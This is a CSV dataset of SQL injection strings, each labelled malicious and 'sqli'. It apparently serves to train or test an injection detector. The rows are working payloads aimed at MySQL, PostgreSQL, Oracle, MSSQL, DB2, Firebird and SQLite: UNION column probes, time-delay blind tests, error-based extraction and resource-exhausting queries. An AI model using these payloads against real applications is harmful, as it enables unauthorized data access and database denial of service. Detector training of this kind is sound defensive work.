payload,label,attack_type
"1"")) union all select null,null,null,null--",malicious,sqli
1) where 2223=2223;(select * from (select(sleep(5)))acdk)#,malicious,sqli
"1')) or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1'+(select fhbk where 2570=2570 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))+'",malicious,sqli
1') rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ('ejnt' like 'ejnt,malicious,sqli
"-7255' union all select 2127,2127,2127,2127,2127#",malicious,sqli
"1'||(select 'dyuw' from dual where 2037=2037;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
1) as xylu where 3338=3338 rlike (select * from (select(sleep(5)))sgvo)--,malicious,sqli
"-3525"" where 3522=3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",malicious,sqli
"1"")) as nncz where 2331=2331;select case when 6420=7941 then 1 else null end--",malicious,sqli
"1"") or 6793=(select 6793 from pg_sleep(5)) and (""lsis"" like ""lsis",malicious,sqli
"-8331') union all select 1452,1452,1452,1452,1452--",malicious,sqli
"-6775"" union all select 7484,7484#",malicious,sqli
"1"")) as tkmd where 3415=3415 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",malicious,sqli
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('fvov'='fvov",malicious,sqli
"1,(begin if (8340=8340) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;)",malicious,sqli
"1) as nkjo where 8462=8462 union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
"-2790') as xhct where 5756=5756 union all select 5756,5756#",malicious,sqli
"1'||(select 'dpce' from dual where 5261=5261 union all select null,null,null,null,null,null--",malicious,sqli
1)) waitfor delay '0:0:5' and ((1636=1636,malicious,sqli
1) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (4703=4703,malicious,sqli
"1"") where 2702=2702 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)--",malicious,sqli
"-3555') or make_set(9354=9354,7185) and ('papr'='papr",malicious,sqli
"1"") and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (""ypoj""=""ypoj",malicious,sqli
"1)) as oqfr where 6426=6426 and make_set(8403=8403,8899)--",malicious,sqli
1' where 6359=6359 and (3020=3020)*6703--,malicious,sqli
1'+(select pagd where 2484=2484;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,malicious,sqli
"1 union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
"-2987"") as iyob where 7827=7827 or (8459=8459)*4906--",malicious,sqli
1 waitfor delay '0:0:5'-- nnnp,malicious,sqli
"1"" and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ""ardk"" like ""ardk",malicious,sqli
"1"")) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((""giuq""=""giuq",malicious,sqli
"1"" where 4281=4281;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"1"")) rlike (select (case when (5342=1036) then 1 else 0x28 end)) and ((""ntdz"" like ""ntdz",malicious,sqli
"-9087"" order by 1#",malicious,sqli
"1')));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('atvu'='atvu",malicious,sqli
1%') order by 1#,malicious,sqli
"1) as zmjm where 9125=9125 or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",malicious,sqli
-9893' or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'pbop'='pbop,malicious,sqli
-8359) where 4430=4430 or 6872=6872--,malicious,sqli
"1'))) and elt(9501=8427,8427) and ((('ahpp'='ahpp",malicious,sqli
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('cuat'='cuat",malicious,sqli
"1"")) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((""qgle"" like ""qgle",malicious,sqli
"1"")) as zemm where 3324=3324 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1"" where 5440=5440 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1%' or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and '%'='",malicious,sqli
"1%"" or (select * from (select(sleep(5)))ydpu) and ""%""=""",malicious,sqli
"1')) as cbka where 3176=3176 and 8407=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('hbld'='hbld",malicious,sqli
"1"")) or (select * from (select(sleep(5)))sddo)#",malicious,sqli
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('cfhi' like 'cfhi",malicious,sqli
1'||(select 'awic' where 5227=5227;begin dbms_lock.sleep(5); end--,malicious,sqli
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('wmrr' like 'wmrr",malicious,sqli
begin if (5624=5624) then dbms_lock.sleep(5); else dbms_lock.sleep(0); end if; end;,malicious,sqli
"-5052))) union all select 8351,8351,8351,8351#",malicious,sqli
"-2397)) as oizy where 1746=1746 union all select 1746,1746,1746,1746,1746,1746#",malicious,sqli
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (((""ekbq""=""ekbq",malicious,sqli
"1""));if(7899=7899) select 7899 else drop function zbbp--",malicious,sqli
"-6772"")) or 9323=9323#",malicious,sqli
"1') and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('vgkt'='vgkt",malicious,sqli
"1'))) union all select null,null,null,null,null,null,null,null,null#",malicious,sqli
"1""))) union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"-3300' union all select 8979,8979,8979,8979,8979,8979--",malicious,sqli
"1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))-- nqdb",malicious,sqli
"1) as vqdh where 1603=1603;iif(4436=8910,1,1/0)",malicious,sqli
"-8608"" or 5460=4461--",malicious,sqli
"-4286%""))) union all select 2229,2229,2229,2229,2229,2229#",malicious,sqli
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""ubvd""=""ubvd",malicious,sqli
"1%' or elt(6272=6272,sleep(5)) and '%'='",malicious,sqli
"elt(5953=5953,1)",malicious,sqli
1%')) rlike (select (case when (6094=7893) then 1 else 0x28 end)) and (('%'=',malicious,sqli
"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)# hlrg",malicious,sqli
-8404)) order by 1--,malicious,sqli
"1"") and 2006=2006",malicious,sqli
-3499'))) or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('nzap' like 'nzap,malicious,sqli
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh",malicious,sqli
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('etzb'='etzb",malicious,sqli
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",malicious,sqli
1'))) and 8594=(select 8594 from pg_sleep(5))--,malicious,sqli
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",malicious,sqli
"1"") and make_set(4539=6401,6401) and (""kglx""=""kglx",malicious,sqli
"-5859) as ernq where 8394=8394 union all select 8394,8394,8394--",malicious,sqli
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",malicious,sqli
"1' or elt(6272=6272,sleep(5))",malicious,sqli
-6095') or 6872=6872 and ('bfwm' like 'bfwm,malicious,sqli
-8465' where 5242=5242 or 3806=7423--,malicious,sqli
"1')));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('kufi'='kufi",malicious,sqli
"-6249'))) union all select 5136,5136,5136,5136,5136,5136,5136,5136,5136--",malicious,sqli
"1,(select (case when (3902=3902) then (select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) else 1/(select 0 from dual) end) from dual)",malicious,sqli
1'))) or (select * from (select(sleep(5)))ydpu) and ((('brhc' like 'brhc,malicious,sqli
"-2111' union all select 1061,1061,1061--",malicious,sqli
"1 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))# hkrp",malicious,sqli
"1 where 6518=6518;select benchmark(5000000,md5(0x714e4153))#",malicious,sqli
"1"") where 2215=2215 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--",malicious,sqli
1));select (case when (9103=9836) then 9103 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
(select (case when (6714=8872) then 1 else 6714*(select 6714 from master..sysdatabases) end)),malicious,sqli
-1300) as rrsm where 1086=1086 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,malicious,sqli
"1"")) as vhrq where 1690=1690 and elt(1210=1210,sleep(5))--",malicious,sqli
"1'+(select 'wkcq' where 1020=1020 and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
"1%');select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ('%'='",malicious,sqli
-7346 or 8571=8571--,malicious,sqli
"-9630%"" union all select 8592,8592,8592,8592--",malicious,sqli
"-2007%')) union all select 7298,7298,7298#",malicious,sqli
"1');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",malicious,sqli
"1"") order by 1#",malicious,sqli
"1'||(select 'setd' from dual where 3686=3686 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users))||'",malicious,sqli
"1'+(select 'qrml' where 3791=3791 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))))+'",malicious,sqli
"1'+(select 'cwta' where 6091=6091;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual)+'",malicious,sqli
"1) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1""))) and 5429=9596",malicious,sqli
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('opyt'='opyt",malicious,sqli
1) where 2468=2468 and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
1') where 1424=1424 and sleep(5)--,malicious,sqli
"1'+(select 'wkbg' where 3921=3921 and 8407=(select count(*) from generate_series(1,5000000)))+'",malicious,sqli
1)));(select * from (select(sleep(5)))srmq) and (((3124=3124,malicious,sqli
"1"")) as ydkd where 2455=2455 and sleep(5)--",malicious,sqli
"1)) as jfae where 6684=6684 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1"") and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (""ilrk""=""ilrk",malicious,sqli
"1') as eany where 3169=3169 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"-4993"" union all select 6959,6959,6959--",malicious,sqli
"1"") as assu where 7521=7521 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3# sfup",malicious,sqli
"1"")) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((""xccy""=""xccy",malicious,sqli
"-8966""))) or 1628=2712",malicious,sqli
"1') as mgko where 1828=1828 and make_set(8403=8403,8899)--",malicious,sqli
-8828)) as ospo where 2141=2141 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,malicious,sqli
"-3443"")) union all select 4043,4043,4043,4043,4043,4043,4043#",malicious,sqli
"1)) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((6829=6829",malicious,sqli
"1"") as ckoi where 4674=4674 union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"1"") and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"1'||(select 'zrea' from dual where 1223=1223 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1%""))) and 7758=4792 and (((""%""=""",malicious,sqli
-2783%')) or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (('%'=',malicious,sqli
1) where 6884=6884 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--,malicious,sqli
"1'||(select 'bzxa' where 6320=6320;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",malicious,sqli
"1%""))) union all select null,null,null,null,null,null#",malicious,sqli
"-3997'+(select 'avjk' where 1917=1917 union all select 1917,1917,1917--",malicious,sqli
1';(select * from (select(sleep(5)))srmq) and 'yfvu' like 'yfvu,malicious,sqli
"1' where 5060=5060;select count(*) from generate_series(1,5000000)--",malicious,sqli
"1')) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and (('ywxe' like 'ywxe",malicious,sqli
"1""))) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (((""dwcy""=""dwcy",malicious,sqli
"1"") where 8612=8612;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1,(select (case when (5433=5433) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",malicious,sqli
"1'))) and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"1%')) union all select null,null,null,null,null,null,null,null,null--",malicious,sqli
"1' where 9602=9602;select benchmark(5000000,md5(0x4c4d6142))--",malicious,sqli
"-5174'))) or make_set(9515=7938,7938) and ((('ygee'='ygee",malicious,sqli
1%')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1"")) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""dbxi"" like ""dbxi",malicious,sqli
1' where 8537=8537 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,malicious,sqli
"1""))) and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""dksc""=""dksc",malicious,sqli
1%' rlike sleep(5)#,malicious,sqli
"-1033 union all select 8731,8731,8731,8731,8731,8731--",malicious,sqli
"1))) and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",malicious,sqli
"-1277"") where 6622=6622 or 3038=3038",malicious,sqli
"1')) as xuab where 4369=4369 union all select null,null,null--",malicious,sqli
"1' in boolean mode);select like('abcdefg',upper(hex(randomblob(500000000/2))))#",malicious,sqli
